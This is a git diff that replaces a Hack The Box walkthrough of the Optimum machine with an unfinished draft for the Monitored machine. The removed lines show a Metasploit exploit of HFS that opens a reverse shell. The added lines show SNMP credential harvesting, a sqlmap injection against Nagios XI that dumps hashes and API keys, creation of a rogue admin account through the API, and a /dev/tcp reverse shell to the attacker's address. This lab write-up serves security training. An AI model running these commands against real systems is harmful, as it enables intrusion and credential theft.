@@ -1,9 +1,9 @@
 ---
-title: HTB - Optimum
-date: 2024-01-12
+title: HTB - Monitored
+date: 2024-01-16
 categories: [CTF, Fullpwn]
-tags: [htb, hackthebox, optimum, nmap, ]
-img_path: /assets/htb/fullpwn/optimum/
+tags: [htb, hackthebox, monitored, nmap, nagiosxi]
+img_path: /assets/htb/fullpwn/monitored/
 published: true
 image:
     path: room_banner.png
@@ -11,352 +11,595 @@ image:
 
 ## Overview
 
-[Optimum](https://app.hackthebox.com/machines/Optimum) is a beginner-level machine which mainly focuses on **enumeration of services with known exploits**. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.
+TBA
 
-## Information gathering
+## Info gathering
 
 ```bash
-sudo nmap -sS -A -Pn --min-rate 10000 -p- optimum
+sudo nmap -sS -A -Pn -p- --min-rate 10000 monitored
 
-PORT   STATE SERVICE VERSION
-80/tcp open  http    HttpFileServer httpd 2.3
-|_http-title: HFS /
-|_http-server-header: HFS 2.3
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|phone|specialized
-Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)
-OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
-Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+
+80/tcp  open  http     Apache httpd 2.4.56
+|_http-title: Did not follow redirect to https://nagios.monitored.htb/
+|_http-server-header: Apache/2.4.56 (Debian)
+
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+443/tcp open  ssl/http Apache httpd 2.4.56
+|_http-server-header: Apache/2.4.56 (Debian)
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Nagios XI
+| tls-alpn:
+|_  http/1.1
+| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
+5667/tcp open  tcpwrapped
+
+Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Only port `80` is listening on this machine, so let's go explore it!
+Nmap info:
+- SSH open, but we need creds.
+- HTTP redirects to HTTPS --> add to `/etc/hosts`
+- Find more about LDAP `389`
+## Web enumeration
 
-## Initial foothold
+Upon visiting the webserver on our browser we find a Nagios XI interface:
 
-Nmap's output let us know that the `HttpFileServer httpd 2.3` service is used on port `80`.  According to [Wikipedia](https://en.wikipedia.org/wiki/HTTP_File_Server):
+![](home.png)
 
-> **HTTP File Server**, otherwise known as HFS, is <u>a free web server specifically designed for publishing and sharing files</u>. The complete feature set differs from other web servers; it lacks some common features, like CGI, or even ability to run as a Windows service, but includes, for example, counting file downloads. It is even advised against using it as an ordinary web server.
+We have encountered Nagios XI before on the Try Hack Me's [Nax](https://cspanias.github.io/posts/THM-Nax/) room. Let's remind ourselves [what Nagios XI is](https://cspanias.github.io/posts/THM-Nax/#21-nagios-xi):
 
-Later in the same article, it has a security section which mentions:
+> Nagios XI is kind of a **[boosted crontab](https://man7.org/linux/man-pages/man5/crontab.5.html)**: it periodically runs scripts which can be reached from a command line or a GUI. When something goes wrong, it will generate an alert in the form of an email or SMS, which helps developers start working on the issue right away, before it has any negative impact on the business productivity.
 
-> **HFS has had multiple security issues in the past**, but states on its website that as of 2013 "_There are no current known security bugs in the latest version. HFS is open source, so anyone is able to easily check for security flaws (and we have many expert users). Although it was not designed to be extremely robust, HFS is very stable and has been used for months without a restart_".
+![](https://cspanias.github.io/assets/thm/fullpwn/nax/Nagios-Working-nagios-Tutorial-Edureka-3.png)
 
-Visiting the website via our browser looks like this:
-
-![](home.png){: .normal width="60%"}
-
-Searching Google for "_HttpFileServer 2.3 exploit_" there are several results that point to [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287):
-
-![](google_search.png){: .normal width="60%"}
-
-We can launch Metasploit and search if there is a module associated with this CVE:
+We can start performing a recursive dir-busting with `ffuf`. It will search for subdirectories, e.g. `https://nagios.monitored.htb/FUZZ,  and if found, will then create a new job and perform dir-busting for `https://nagios.monitored.htb/newly-found-directory/FUZZ`:
 
 ```bash
-$ msfconsole -q
-msf6 > search CVE-2014-6287
+$ ffuf -u https://nagios.monitored.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion
 
-Matching Modules
-================
-
-   #  Name                                   Disclosure Date  Rank       Check  Description
-   -  ----                                   ---------------  ----       -----  -----------
-   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
-```
-
-Luckily there is one! Let's configure it:
-
-```bash
-msf6 > use 0
-s[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf6 exploit(windows/http/rejetto_hfs_exec) > show options
-
-Module options (exploit/windows/http/rejetto_hfs_exec):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   HTTPDELAY  10               no        Seconds to wait before terminating web server
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
-                                         using-metasploit.html
-   RPORT      80               yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the
-                                         local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       The path of the web application
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     172.31.150.94    yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS 10.10.10.8
-RHOSTS => 10.10.10.8
-msf6 exploit(windows/http/rejetto_hfs_exec) > setg LHOST tun0
-LHOST => tun0
-```
-
-We are now ready to run the exploit:
-
-```bash
-msf6 exploit(windows/http/rejetto_hfs_exec) > run
-
-[*] Started reverse TCP handler on 10.10.14.15:4444
-[*] Using URL: http://10.10.14.15:8080/OPUDX6tKvSfLNyB
-[*] Server started.
-[*] Sending a malicious request to /
-[*] Payload request received: /OPUDX6tKvSfLNyB
-[*] Sending stage (175686 bytes) to 10.10.10.8
-[!] Tried to delete %TEMP%\RLcLn.vbs, unknown result
-[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.8:49162) at 2024-01-13 09:28:54 +0000
-[*] Server stopped.
-
-meterpreter >
-```
-
-We have a meterpreter shell back! Let's try to get our first flag:
-
-```bash
-meterpreter > dir
-Listing: C:\Users\kostas\Desktop
-================================
-
-Mode              Size    Type  Last modified              Name
-----              ----    ----  -------------              ----
-040777/rwxrwxrwx  0       dir   2024-01-19 18:26:58 +0000  %TEMP%
-100666/rw-rw-rw-  282     fil   2017-03-18 11:57:16 +0000  desktop.ini
-100777/rwxrwxrwx  760320  fil   2017-03-18 12:11:17 +0000  hfs.exe
-100444/r--r--r--  34      fil   2024-01-19 18:10:20 +0000  user.txt
-
-meterpreter > cat user.txt
 <SNIP>
+javascript              [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 28ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/javascript/FUZZ
+
+nagios                  [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 29ms]
+                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 28ms]
+[INFO] Starting queued job on target: https://nagios.monitored.htb/javascript/FUZZ
+
+jquery                  [Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 32ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/javascript/jquery/FUZZ
+```
+
+Based on the above output, we can see that `ffuf` discovered 2 new directories: `/javascript` and `/nagios`. It then went on to enumerate the former and found `/javascript/jquery`, but it did not enumerate the latter. This is because it got a [`401` Unauthorized error](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) response code, and couldn't proceed without credentials. 
+
+So it seems that `/nagios` is some sort of another login portal:
+
+![](nagios_subdir.png)
+
+Unfortunately, we don't have any credentials at the moment. We can always try searching for default credentials used in Nagios XI:
+
+![](nagios_def_creds.png)
+
+Unfortunately, that did not work! Next, we can try perform a **Hail Mary** scan using [incursore](https://github.com/wirzka/incursore) and see what we get back:
+
+```bash
+# hail mary mode!
+$ sudo incursore.sh -H 10.10.11.248 --type All
+```
+
+`incursore` produced a ton of files, but it neatly organized them for us:
+
+```bash
+$ tree 10.10.11.248/
+10.10.11.248/
+├── incursore_10.10.11.248_All.txt
+├── nmap
+│   ├── CVEs_10.10.11.248.nmap
+│   ├── full_TCP_10.10.11.248.nmap
+│   ├── Recon_10.10.11.248.nmap
+│   ├── Script_TCP_10.10.11.248.nmap
+│   ├── UDP_10.10.11.248.nmap
+│   ├── UDP_Extra_10.10.11.248.nmap
+│   └── Vulns_10.10.11.248.nmap
+└── recon
+    ├── ffuf_10.10.11.248_443.txt
+    ├── ffuf_10.10.11.248_80.txt
+    ├── ldapsearch_10.10.11.248.txt
+    ├── ldapsearch_DC_10.10.11.248.txt
+    ├── nmap_ldap_10.10.11.248.txt
+    ├── screenshot_http_10.10.11.248_80.jpeg
+    ├── screenshot_https_10.10.11.248_443.jpeg
+    ├── snmpcheck_10.10.11.248.txt
+    ├── snmpwalk_10.10.11.248.txt
+    └── sslscan_10.10.11.248_443.txt
+
+3 directories, 18 files
+```
+
+After going through the `incursore_10.10.11.248_All.txt` file, we can note down whatever we think that might be useful:
+
+```bash
+<SNIP>
+
+[*] UDP port scan launched
+
+PORT    STATE SERVICE
+123/udp open  ntp
+161/udp open  snmp
+
+<SNIP>
+
+[+] Starting snmp-check session
+
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 10.10.11.248:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 10.10.11.248
+  Hostname                      : monitored
+  Description                   : Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
+  Contact                       : Me <root@monitored.htb>
+  Location                      : Sitting on the Dock of the Bay
+  Uptime snmp                   : 00:56:30.21
+  Uptime system                 : 00:56:18.35
+  System date                   : 2024-1-13 16:14:19.0
+
+<SNIP>
+```
+
+We see that there is an NTP service and an SNMP service listening on port `123` and port `161`, respectively. We can also see some system info.
+
+According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp):
+
+> The **Network Time Protocol (NTP)** is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks.
+
+Trying the commands listed on the above article, did not get us anywhere. 
+
+Let's see if SNMP has more to offer after reminding ourselves what SNMP is used for: 
+
+> **Simple Network Management Protocol (SNMP)** is a protocol for remotely monitoring and configuring network devices, such as routers, switches, servers, IoT devices, etc. It is used to collect and report data from network devices connected to IP networks ([The Ultimate Guide to SNMP](https://www.auvik.com/franklyit/blog/the-ultimate-guide-to-snmp/)).
+
+[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) also has an article for pentesting SNMP, but `incursorone` has already done most of it already. If we keep reading `incursore`'s output, or just the `10.10.11.248/recon/snmpwalk_10.10.11.248.txt`  file, we will find some credentials:
+
+```bash
+iso.3.6.1.2.1.25.4.2.1.5.561 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
+
+<SNIP>
+
+iso.3.6.1.2.1.25.4.2.1.5.1447 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
+iso.3.6.1.2.1.25.4.2.1.5.1448 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
+
+<SNIP>
+
+```
+
+We can try using those (`svc:XjH7VCehowpR1xZB`) to log into the Nagios one of the two login portal we have discovered. It seems that they do not work at `https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1`, but they do work at `https://nagios.monitored.htb/nagios` !  
+
+![](nagios_login.png)
+
+After searching around for a while we can't find much, other than the software's version: `4.4.13`. Now that we have the version, we can search for any associated vulnerabilities. There is [CVE-2019-15949](https://nvd.nist.gov/vuln/detail/CVE-2019-15949) which has a metasploit module, but it does seem to work. There is an interesting [post](https://outpost24.com/blog/nagios-xi-vulnerabilities/) from Outpost24 which lists a number of Nagios XI vulnerabilities related to privilege escalation.
+
+Since, we don't have many avenues to go explore for now, let's also dir-bust the `/nagiosxi` directory.
+
+```bash
+$ ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -recursion
+
+<SNIP>
+
+help                    [Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 26ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/help/FUZZ
+
+tools                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 28ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/tools/FUZZ
+
+mobile                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 28ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/mobile/FUZZ
+
+admin                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 28ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/admin/FUZZ
+
+reports                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 29ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/reports/FUZZ
+
+account                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 31ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/account/FUZZ
+
+includes                [Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 29ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/includes/FUZZ
+
+backend                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 33ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/backend/FUZZ
+
+db                      [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 28ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/db/FUZZ
+
+api                     [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 32ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/api/FUZZ
+
+config                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 30ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/config/FUZZ
+
+views                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 30ms]
+[INFO] Adding a new job to the queue: https://nagios.monitored.htb/nagiosxi/views/FUZZ
+
+sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 304ms]
+terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 78ms]
+
+<SNIP>
+```
+
+It seems that this has a lot of directories, so it is a good idea to adjust our scan by removing the recursion flag and then enumerate just what it seems interesting:
+
+```bash
+$ ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+
+mobile                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 31ms]
+admin                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 29ms]
+reports                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 30ms]
+account                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 29ms]
+includes                [Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 30ms]
+backend                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 29ms]
+db                      [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 33ms]
+api                     [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 32ms]
+config                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 43ms]
+views                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 31ms]
+sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 30ms]
+terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 74ms]
+```
+
+A lot of directories have been found, including `/admin`, `/api` and `/terminal`, among others. After enumerating all of them, here is what we have:
+
+| Directories                                                  | Subdirectories                                  |
+|--------------------------------------------------------------|-------------------------------------------------|
+| `/mobile`                                                    | `/static`, `/views`, `/controllers`             |
+| `/includes`                                                  | `/css`, `/js`, `/components`, `/lang`, `/fonts` |
+| `/backend`                                                   | `/includes`                                     |
+| `/db`                                                        | `/adodb`                                        |
+| `/api`                                                       | `/includes`, `/v1`                              |
+| `/config`                                                    | `/deployment`                                   |
+| `/terminal`                                                  | `/secure`, `/plain`                             |
+| `/admin`, `/reports`, `/account`, `/db`, `/views`, `/sounds` | None                                            |
+
+From those, we can further explore:
+- `/terminal` because it is a terminal after all!
+- `/api` because it represents the intended way for developers and other apps to communicate with the application.
+
+The `/terminal` directory requires credentials, and the ones we currently have do not work:
+
+![](terminal_login.png)
+
+Next, we can recursively scan with the `/api` directory. It turns out that `/api/includes` does not have other subdirectories, but when it starts scanning the `/api/v1` subdirectory it returns the following:
+
+```bash
+$ ffuf -u https://nagios.monitored.htb/nagiosxi/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion
+
+<SNIP>
+
+[INFO] Starting queued job on target: https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
+
+full                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 437ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 451ms]
+serial                  [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 509ms]
+spacer                  [Status: 200, Size: 32, Words: 4, Lines: 
+
+<SNIP>
+```
+
+We can try filtering out `ffuf`'s output by HTTP response size, in this case `32`:
+
+```bash
+$ ffuf -u https://nagios.monitored.htb/nagiosxi/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -fs 32
+
+license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 422ms]
+%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 27ms]
+video games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 40ms]
+authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 819ms]
+4%20Color%2099%20IT2    [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 238ms]
+long distance           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 27ms]
+
+<SNIP>
+```
+
+There are lot sub-directories returned with the HTTP [`403 Forbidden` response status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403). Interestingly enough, there are two subdirectories with the HTTP [`200 OK` response status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200): `/license` and `/authenticate`. We can try to see how these requests look like using Burp. We get a "*Unknown API*" error message upon reaching `/license`:
+
+![](license_dir.png)
+
+When sending a `GET` request to `/authenticate`, we get the following:
+
+![](v1_auth_error.png)
+
+Changing the request method from `GET` to `POST`:
+
+![](post_v1_auth_error.png)
+
+After trying to pass our current creds (`svc:XjH7VCehowpR1xZB`) as plain parameters or in JSON format, nothing worked. To find out how the login request works, we can try to login to `/nagiosxi/login.php` with our non-working credentials, capture the request, and then inspect it:
+
+![](login_request_params.png)
+
+We can keep the request as it is, but send it to `/api/v1/authenticate`:
+
+![](auth_token.png)
+
+We get an authentication token back: `"auth_token":"1c57b07be29194d09f34d35587f84fe716c74e1f"`. Upon searching what we can do with this, we find the [API documentation](https://www.nagios.org/ncpa/help/2.0/api.html) which includes the following token usage: `https://localhost:5693/api?token=mytoken`. Let's try that:
+
+![](token_error.png)
+
+<!-- After searching some more about token authentication, we find a post titled as "[_Help with insecure login / backend ticket authentication](https://support.nagios.com/forum/viewtopic.php?t=58783&sid=d7eb283ff38882a13a1d5efa18649ac7)_" and seems to use the `/index.php` to pass the credentials instead of `/api/v1/authenticate`. Let's see where this does for us:
+
+![](token_redirection.png)
+
+![](token_login.png)
+
+That actually worked, we managed to use the token to authenticate! 
+
+![](token_login_browser.png)
+
+We found this [post](https://outpost24.com/blog/nagios-xi-vulnerabilities/) before which mentions 3 SQLi and one XSS privilege escalation attacks. We can try the first one, [CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931) using `sqlmap`:
+
+```bash
+# enumerate databases
+$ sqlmap --url="https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --method=POST --cookie="nagiosxi=hl3av7bhs2mrk4kc6h49pj13qc" -p id --drop-set-cookie --risk=3 --level=5 --dbs
+
+<SNIP>
+
+[15:57:03] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.56
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[15:57:03] [INFO] fetching database names
+[15:57:03] [INFO] resumed: 'information_schema'
+[15:57:03] [INFO] resumed: 'nagiosxi'
+available databases [2]:
+[*] information_schema
+[*] nagiosxi
+
+<SNIP>
+```
+
+We got some information back:
+- The DMBS used is MySQL.
+- We have two databases: `nagiosxi` and `information_schema`.
+
+The [vulnerability description](https://outpost24.com/blog/nagios-xi-vulnerabilities/) mentions that the `xi_users` table; let's see if this exists:
+
+```bash
+# enumerate tables
+$ sqlmap --url="https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --method=POST --cookie="nagiosxi=hl3av7bhs2mrk4kc6h49pj13qc" -p id --drop-set-cookie --risk=3 --level=5 --dbms=MySQL -D nagiosxi --tables
+
+<SNIP>
+
+Database: nagiosxi
+[22 tables]
++-----------------------------+
+| xi_auditlog                 |
+| xi_auth_tokens              |
+| xi_banner_messages          |
+| xi_cmp_ccm_backups          |
+| xi_cmp_favorites            |
+| xi_cmp_nagiosbpi_backups    |
+| xi_cmp_scheduledreports_log |
+| xi_cmp_trapdata             |
+| xi_cmp_trapdata_log         |
+| xi_commands                 |
+| xi_deploy_agents            |
+| xi_deploy_jobs              |
+| xi_eventqueue               |
+| xi_events                   |
+| xi_link_users_messages      |
+| xi_meta                     |
+| xi_mibs                     |
+| xi_options                  |
+| xi_sessions                 |
+| xi_sysstat                  |
+| xi_usermeta                 |
+| xi_users                    |
++-----------------------------+
+
+<SNIP>
+```
+
+The table `xi_users` exists indeed! Let's see what it contains:
+
+```bash
+# enumerate xi_users table
+$ sqlmap --url="https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --method=POST --cookie="nagiosxi=hl3av7bhs2mrk4kc6h49pj13qc" -p id --drop-set-cookie --risk=3 --level=5 --dbms=MySQL -D nagiosxi -T xi_users --dump
+
+<SNIP>
+
+Database: nagiosxi
+Table: xi_users
+[2 entries]
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
+| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc
+| 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705417476   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 5              | 1699697433           |
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+
+<SNIP>
+```
+The `xi_users` table contains the hashed `password` (`$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C`), and the `api_key` (`IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`) of the `nagiosadmin` account!
+
+After searching how the API key is used on Nagios XI, we find [this](https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf):
+
+_An example of a CURL command used to access the API is as follows:_
+
+```bash
+curl -XGET "http://10.25.5.2/nagiosxi/api/v1/system/status?apikey=5goacg8s&pretty=1"
+```
+
+Let's try this:
+
+```bash
+curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=xhi4m&password=password&name=xhi4m&email=xhi4m@mail.com&auth_level=admin"
+{
+    "success": "User account xhi4m was added successfully!",
+    "user_id": 6
+}
+```
+
+We successfully created the user `xhi4m` with `admin` privileges! Let's login:
+
+![](login_xhi4m)
+
+```bash
+curl -XGET "https://nagios.monitored.htb/nagiosxi/api/v1/awesome/example/data1/data2?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1"
+```
+
+[Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf)
+
+```bash
+$ python3 /opt/revshellgen/revshellgen.py
+
+  ____ ___  _  __  ___  / /  ___   / /  / /  ___ _ ___   ___
+ / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \
+/_/   \__/ |___/ /___//_//_/\__/ /_/  /_/   \_, / \__/ /_//_/
+                                           /___/
+
+
+---------- [ SELECT IP ] ----------
+
+[   ] 172.31.150.94 on eth0
+[   ] 172.17.0.1 on docker0
+[ x ] 10.10.14.11 on tun0
+[   ] Specify manually
+
+---------- [ SPECIFY PORT ] ----------
+
+[ # ] Enter port number : 1337
+
+---------- [ SELECT COMMAND ] ----------
+
+[   ] unix_bash
+[ x ] unix_java
+[   ] unix_nc_mkfifo
+[   ] unix_nc_plain
+[   ] unix_perl
+[   ] unix_php
+[   ] unix_python
+[   ] unix_ruby
+[   ] unix_telnet
+[   ] windows_powershell
+
+---------- [ SELECT SHELL ] ----------
+
+[   ] /bin/sh
+[ x ] /bin/bash
+[   ] /bin/zsh
+[   ] /bin/ksh
+[   ] /bin/tcsh
+[   ] /bin/dash
+
+---------- [ SELECT ENCODE TYPE ] ----------
+
+[ x ] NONE
+[   ] URL ENCODE
+[   ] BASE64 ENCODE
+
+---------- [ FINISHED COMMAND ] ----------
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.11/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+[ ! ] Reverse shell command copied to clipboard!
+[ + ] In case you want to upgrade your shell, you can use this:
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+---------- [ SETUP LISTENER ] ----------
+
+[ x ] yes
+[   ] no
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.11.248:57296.
+bash: cannot set terminal process group (11677): Inappropriate ioctl for device
+bash: no job control in this shell
+nagios@monitored:/tmp$ ls
+ls
+memcalc
+systemd-private-3027788ee0d44a8b9ce8ffdd9e495dd5-apache2.service-I5CXmj
+systemd-private-3027788ee0d44a8b9ce8ffdd9e495dd5-ntp.service-MZO8Rh
+systemd-private-3027788ee0d44a8b9ce8ffdd9e495dd5-systemd-logind.service-8C27ah
+vmware-root_472-860398016
+nagios@monitored:/tmp$
+```
+
+```bash
+$ sudo nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.248] 48796
